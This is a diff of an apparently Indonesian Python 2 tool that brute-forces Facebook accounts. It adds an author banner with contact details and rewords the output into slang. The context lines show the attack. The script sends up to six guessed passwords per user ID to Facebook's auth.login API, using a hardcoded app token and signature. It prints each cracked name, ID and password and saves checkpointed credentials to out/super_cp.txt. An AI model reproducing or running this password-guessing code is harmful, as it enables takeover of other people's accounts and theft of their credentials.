@@ -72,6 +72,13 @@ logo ="""\033[1;91m
 |  $$$$$$/| $$  | $$|  $$$$$$/|  $$$$$$/   | $$   
  \______/ |__/  |__/ \______/  \______/    |__/   
 \033[0m"""
+\033[1;93m➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫
+\033[1;97mAuthor : AangSans-Xyz
+\033[1;97mGithub : Github.com/Aang21
+Facebook : Https://www.facebook.com/clubfunbike
+WhatsApp : 089524163441/0882007090803
+\033[1;94m➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫➫
+"""
 
 def tik():
     titik = ['.   ', '..  ', '... ']
@@ -97,8 +104,8 @@ def masuk():
     os.system('clear')
     print logo
     print '                                     '
-    print '[1] Login Using Token'
-    print '[0] Exit/Keluar'
+    print '[01.] Login Using Token'
+    print '[00.] Exit/Keluar'
     print '                                      '
     pilih_masuk()
 
@@ -259,7 +266,8 @@ def pilih_super():
             time.sleep(1)
 
     print
-    print '\tTo Stop Press CTRL + z'
+    print '\tUntuk Berhenti Tekan CTRL + z'
+    print '\tJika Tidak Ada Hasil, Gunakan Mode Pesawat [5 Detik] Saja'
     print 42 * '='
 
     def main(arg):
@@ -276,16 +284,16 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print 'BERHASIL'
-                print 'Nama > ' + b['name']
-                print 'ID > ' + user
-                print 'Sandi > ' + pass1 + '\n'
+                print '[SUKSES BRO]'
+                print '[Nama] -> ' + b['name']
+                print '[ID] -> ' + user
+                print '[Sand]i -> ' + pass1 + '\n'
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print 'CEKPOINT'
-                print 'Nama > ' + b['name']
-                print 'ID > ' + user
-                print 'Sandi > ' + pass1 + '\n'
+                print '[GAGAL NJING]'
+                print '[Nama] -> ' + b['name']
+                print '[ID] -> ' + user
+                print '[Sandi] -> ' + pass1 + '\n'
                 cek = open('out/super_cp.txt', 'a')
                 cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                 cek.close()
@@ -295,13 +303,13 @@ def pilih_super():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print 'BERHASIL'
+                    print 'SUKSES BRO'
                     print 'Nama > ' + b['name']
                     print 'ID > ' + user
                     print 'Sandi > ' + pass2 + '\n'
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print 'CEKPOINT'
+                    print 'GAGAL NJING'
                     print 'Nama > ' + b['name']
                     print 'ID > ' + user
                     print 'Sandi > ' + pass2 + '\n'
@@ -314,16 +322,16 @@ def pilih_super():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print 'BERHASIL'
-                        print 'Nama > ' + b['name']
-                        print 'ID > ' + user
-                        print 'Sandi > ' + pass3 + '\n'
+                        print '[SUKSES BRO]'
+                        print '[Nama] -> ' + b['name']
+                        print '[ID] -> ' + user
+                        print '[Sandi] -> ' + pass3 + '\n'
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print 'CEKPOINT'
-                        print 'Nama > ' + b['name']
-                        print 'ID > ' + user
-                        print 'Sandi > ' + pass3 + '\n'
+                        print '[GAGAL NJING]'
+                        print '[Nama] -> ' + b['name']
+                        print '[ID] -> ' + user
+                        print '[Sandi] -> ' + pass3 + '\n'
                         cek = open('out/super_cp.txt', 'a')
                         cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                         cek.close()
@@ -333,16 +341,16 @@ def pilih_super():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print 'BERHASIL'
-                            print 'Nama > ' + b['name']
-                            print 'ID > ' + user
-                            print 'Sandi > ' + pass4 + '\n'
+                            print '[SUKSES BRO]'
+                            print 'Nama] -> ' + b['name']
+                            print '[ID] -> ' + user
+                            print '[Sandi] +> ' + pass4 + '\n'
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print 'CEKPOINT'
-                            print 'Nama >n' + b['name']
-                            print 'ID > ' + user
-                            print 'Sandi > ' + pass4 + '\n'
+                            print '[GAGAL NJING]'
+                            print '[Nama] ->n' + b['name']
+                            print '[ID] -> ' + user
+                            print '[Sandi] -> ' + pass4 + '\n'
                             cek = open('out/super_cp.txt', 'a')
                             cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                             cek.close()
@@ -353,16 +361,16 @@ def pilih_super():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print 'BERHASIL'
-                                print 'Nama > ' + b['name']
-                                print 'ID > ' + user
-                                print 'Sandi > ' + pass5 + '\n'
+                                print '[SUKSES BRO]'
+                                print '[Nama] -> ' + b['name']
+                                print '[ID] -> ' + user
+                                print '[Sandi] -> ' + pass5 + '\n'
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print 'CEKPOINT'
-                                print 'Nama > ' + b['name']
-                                print 'ID > ' + user
-                                print 'Sandi > ' + pass5 + '\n'
+                                print '[GAGAL NJING]'
+                                print '[Nama] -> ' + b['name']
+                                print '[ID] -> ' + user
+                                print '[Sandi] -> ' + pass5 + '\n'
                                 cek = open('out/super_cp.txt', 'a')
                                 cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                 cek.close()
@@ -372,16 +380,16 @@ def pilih_super():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print 'BERHASIL'
-                                    print 'Nama > ' + b['name']
-                                    print 'ID > ' + user
-                                    print 'Sandi > ' + pass6 + '\n'
+                                    print '[SUKSES BRO]'
+                                    print '[Nama] -> ' + b['name']
+                                    print '[ID] -> ' + user
+                                    print '[Sandi] -> ' + pass6 + '\n'
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print 'CEKPOINT'
-                                    print 'Nama > ' + b['name']
-                                    print 'ID > ' + user
-                                    print 'Sandi >!' + pass6 + '\n'
+                                    print '[GAGAL NJING]'
+                                    print '[Nama] -> ' + b['name']
+                                    print 'ID -> ' + user
+                                    print 'Sandi ->!' + pass6 + '\n'
                                     cek = open('out/super_cp.txt', 'a')
                                     cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                     cek.close()
@@ -395,7 +403,7 @@ def pilih_super():
     print 'OK > ' + str(len(oks))
     print 'CP > ' + str(len(cekpoint))
     print 'CP File tersimpan out/super_cp.txt'
-    raw_input('\nTekan Enter Untuk Kembali')
+    raw_input('\nTEKAN ENTER UNTUK KEMBALI')
     super()
 
 
